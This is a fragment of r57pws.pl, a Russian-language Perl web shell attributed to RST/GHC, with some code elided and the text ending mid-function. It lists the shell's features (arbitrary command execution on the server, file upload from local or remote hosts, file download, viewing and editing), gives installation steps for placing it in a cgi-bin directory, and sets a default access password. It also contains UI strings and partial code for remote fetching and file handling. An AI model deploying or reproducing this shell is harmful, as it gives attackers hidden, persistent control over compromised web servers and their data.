...
## r57pws.pl - Perl Web Shell by RST/GHC
## -------------------------------------
## Функции скрипта:
## ~~~~~~~~~~~~~~~~
## - выполнение произвольных команд на сервере (+ алиасы команд)
## - загрузка файлов на сервер с локального компьютера пользователя
## - загрузка файлов на сервер с удаленного сервера
## - скачивание произвольных файлов с сервера
...
## Особенности скрипта:
## ~~~~~~~~~~~~~~~~~~~~
## - работает как на unix так и на windows платформах
## - все данные гоняются через POST запросы
##
## Установка:
## ~~~~~~~~~~
## 1. Измените первую сроку скрипта "/usr/bin/perl" на корректный путь к интерпритатору перла 
##    на Вашем сервере.
## 2. Установите пароль для доступа к скрипту в секции настроек (раздел CONFIG).
## 3. В случае если сервер работает под управлением WINDOWS то установите $unix = 0 в секции
##    настроек скрипта (раздел CONFIG).
## 4. Загрузите файл на сервер в папку допускающую запуск cgi-скриптов, обычно cgi-bin.
##    Загрузка должна производится в ASCII режиме.
## 5. Смените права на скрипт (chmod 755).
## 6. Откройте скрипт в браузере и наслаждайтесь.
## -------------------------------------
## (c)oded by 1dt.w0lf
## RST/GHC
## http://rst.void.ru
...
############### CONFIG
$auth = 1;         # Авторизация (1 - включена, 0 - выключена)
$password = 'r57'; # Пароль для доступа к скрипту
$unix = 1;         # Для WINDOWS сменить на $unix = 0
# Дальше ничего не меняйте в конфиге, если не уверены в том, что делаете.
...
############### TEXT
@lang = (
'<b><font color=red>Выполнение команд на сервере</font></b><br>',
'<b>Команда:</b>',
'<b>Директория:</b>',
'<b><font color=red>Алиасы команд</font></b><br>',
'<b>Алиас:</b>',
'Выполнить',
'<b>Выполненная команда:</b>',
'  Сменить  ',
'<b><font color=red>Загрузка файла с локального компьютера</font></b><br>',
'<b>Файл:</b>',
'Загрузить',
'<b><font color=red>Загрузка файла c удаленного сервера</font></b><br>',
'<b><font color=red>Просмотр/Редактирование файла</font></b><br>',
'Просмотр',
'<b>Редактирование файла:</b>',
'<b>Просмотр файла:</b>',
'Сохранить',
'<b><font color=red>Скачивание файла</font></b><br>',
' Скачать ',
...
'<b>IP:</b>',
'CONNECT',
'<b><font color=red>Введите пароль</font></b><br>',
'Войти'
);
############### HTML
$d1 = '<div align=center>';
...
if($FORM{ACTION} eq 'ALIAS'){ $FORM{CMD} = $alias{$FORM{ALIAS}}; }
 ...
 { 
  ...
  else { $error = "Ошибка! Не могу создать файл <font color=black>$filename</font>"; }
  }
 ...
 if($FORM{FILE} =~ m!^(?:http:\/\/)([^\/]*)(\/.*)$!)
  ...
  if($sock)
   ...
   if($a != 200) { $error = "Ошибка! Файл <font color=black>$path</font> не найден на сервере <font color=black>$server</font>"; }
   }
  else { $error = "Ошибка! Не могу соединиться с <font color=black>$server</font>"; }
  if(!$error)
   {
   $filename = $cur_dir;
   chop($filename) if ($filename =~ m/[\\\/]$/);
 ...
 else { $error = "Ошибка! Не могу открыть файл <font color=black>$FORM{EFILE}</font>"; }
 if(!$error)
  {
  open(VF,$FORM{EFILE});
 ...
 else { $error = "Ошибка! Не могу сохранить файл <font color=black>$FORM{SFILE}</font>"; }
 }
 ...
 if(open(DF,$FORM{DFILE}))
  ...
  else { $error = "Ошибка! Не могу открыть файл <font color=black>$FORM{DFILE}</font>"; }
 }
...
sub link()
 {
 print "<HTML><BODY><div align=center><font face=verdana size=1><b>DONE!<br><br><a href=$script_name>Назад</a></b></font></div></BODY></HTML>";
 }
############### LOGIN FORM
sub form_login()
 {
